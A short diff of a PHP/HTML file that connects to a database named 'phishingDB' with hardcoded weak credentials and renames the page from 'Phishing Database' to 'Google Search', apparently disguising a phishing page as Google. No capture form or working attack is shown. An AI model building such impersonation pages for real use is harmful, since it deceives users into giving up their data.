@@ -1,6 +1,6 @@
 <!-- Connect to the database -->
 <?php
-$server = "alexpi.local";
+$server = "localhost";
 $username = "php";
 $password = "password";
 $database = "phishingDB";
@@ -15,7 +15,7 @@ echo "Connected successfully<br>";
 <!DOCTYPE html>
 <html>
     <head>
-        <title>Phishing Database</title>
+        <title>Google Search</title>
     </head>
     <body>
         <h1>Google</h1>
